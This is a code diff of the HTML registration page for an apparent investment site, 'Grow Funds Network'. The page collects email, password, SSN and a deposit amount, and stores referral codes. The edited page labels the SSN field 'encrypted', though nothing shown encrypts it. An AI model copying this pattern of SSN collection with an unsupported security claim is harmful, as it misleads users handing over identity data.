@@ -3,63 +3,65 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Register - Grow Funds Network</title>
+<title>Register – Grow Funds Network</title>
 
-<!-- Firebase Scripts -->
-<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js"></script>
-<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js"></script>
-<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js"></script>
-<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-storage.js"></script>
-
-<!-- Your Script -->
 <script src="script.js" defer></script>
 
 <style>
-body{display:flex;justify-content:center;align-items:center;min-height:100vh;background:#0f1223;color:#fff;font-family:sans-serif;}
-.card{background:#151a33;padding:40px;border-radius:15px;max-width:450px;width:100%;box-shadow:0 10px 25px rgba(0,0,0,0.5);}
-h2{color:#00ffa6;text-align:center;margin-bottom:20px;}
-input, select{width:100%;padding:15px;margin-bottom:15px;border-radius:10px;border:none;background:#1c2240;color:#fff;font-size:16px;}
-button{width:100%;padding:15px;background:#00ffa6;color:#000;font-weight:bold;font-size:16px;border:none;border-radius:10px;cursor:pointer;transition:0.3s;margin-bottom:15px;}
-button:hover{background:#00cc85;}
-p{color:#ccc;text-align:center;}
-a{color:#00ffa6;font-weight:bold;}
-.progress-container{background:#1c2240;border-radius:10px;width:100%;height:20px;margin-bottom:20px;overflow:hidden;}
-.progress-bar{height:100%;width:0%;background:#00ffa6;text-align:center;color:#000;font-weight:bold;}
+body{
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  min-height:100vh;
+  background:#0f1223;
+  color:#fff;
+  font-family:sans-serif;
+}
+.card{
+  background:#151a33;
+  padding:40px;
+  border-radius:15px;
+  width:100%;
+  max-width:450px;
+}
+input, select, button{
+  width:100%;
+  padding:14px;
+  margin-bottom:14px;
+  border:none;
+  border-radius:10px;
+}
+input, select{background:#1c2240;color:#fff;}
+button{background:#00ffa6;color:#000;font-weight:bold;cursor:pointer;}
 </style>
 </head>
+
 <body>
 
 <div class="card">
-  <h2>Create Your Account</h2>
+  <h2>Create Account</h2>
 
-  <input id="email" type="email" placeholder="Email">
-  <input id="password" type="password" placeholder="Password">
-  <input id="ssn" type="text" placeholder="SSN (for verification)">
-  <input id="dl" type="file" accept="image/*,application/pdf">
-
-  <select id="planSelect">
-    <option value="starter">Starter ($10-$97)</option>
-    <option value="builder">Builder ($100-$999)</option>
-    <option value="income">Income ($1,000-$9,999)</option>
-    <option value="premium">Premium ($10,000-$99,999)</option>
-    <option value="elite">Elite ($100,000+)</option>
+  <input id="email" type="email" placeholder="Email" required>
+  <input id="password" type="password" placeholder="Password" required>
+  <input id="ssn" type="text" placeholder="SSN (encrypted)">
+  
+  <select id="plan">
+    <option value="starter">Starter</option>
+    <option value="builder">Builder</option>
+    <option value="income">Income</option>
+    <option value="premium">Premium</option>
   </select>
 
-  <input id="depositAmount" type="number" placeholder="Initial Deposit Amount">
+  <input id="deposit" type="number" placeholder="Deposit Amount">
 
-  <div class="progress-container">
-    <div id="depositProgress" class="progress-bar">0%</div>
-  </div>
+  <button onclick="registerUser()">Register</button>
 
-  <button id="registerBtn">Register Now</button>
-  <p>Already have an account? <a href="login.html">Login here</a></p>
+  <p>Already have an account? <a href="login.html">Login</a></p>
 </div>
 
 <script>
-  // Save referral code if present in URL
-  const urlParams = new URLSearchParams(window.location.search);
-  const ref = urlParams.get("ref");
-  if(ref) localStorage.setItem("referrer", ref);
+const params = new URLSearchParams(window.location.search);
+if(params.get("ref")) localStorage.setItem("referrer", params.get("ref"));
 </script>
 
 </body>
